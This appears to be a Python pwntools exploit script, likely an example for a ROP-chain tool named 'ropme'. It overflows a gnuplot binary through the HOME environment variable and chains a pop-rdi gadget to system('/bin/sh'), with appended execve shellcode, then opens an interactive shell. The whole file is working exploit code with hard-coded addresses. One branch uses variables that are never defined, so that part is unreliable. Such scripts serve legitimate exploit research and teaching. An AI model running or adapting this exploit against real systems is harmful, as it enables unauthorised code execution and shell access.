import sys, os
from pwn import *
import ropme

shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
    "\x48\x31\xd2"                                  # xor    %rdx, %rdx
 +  "\x48\x31\xc0"                                  # xor    %rax, %rax
 +  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      # mov  $0x68732f6e69622f2f, %rbx
 +  "\x48\xc1\xeb\x08"                              # shr    $0x8, %rbx
 +  "\x53"                                          # push   %rbx
 +  "\x48\x89\xe7"                                  # mov    %rsp, %rdi
 +  "\x50"                                          # push   %rax
 +  "\x57"                                          # push   %rdi
 +  "\x48\x89\xe6"                                  # mov    %rsp, %rsi
 +  "\xb0\x3b"                                      # mov    $0x3b, %al
 +  "\x0f\x05"                                      # syscall
)

if len(sys.argv) < 2: # manual mode
  BIN_SH = 0x44470C
  SYSTEM = 0x4019c0
  POP_RDI = 0x402f09 # pop rdi ; ret

  rop = (
      p64(POP_RDI)
    + p64(BIN_SH)

    + p64(SYSTEM)
  )
else:
  rop = ropme.rop_to_shellcode([(filename, 0)], target_address)

payload = 'A'*512 + 'B'*8 + rop
payload += ((1024 - len(payload)) * 'B') + shellcode

os.environ["HOME"] = payload # trigger the vulnerability

p = process(['./example/gnuplot'])

p.interactive()
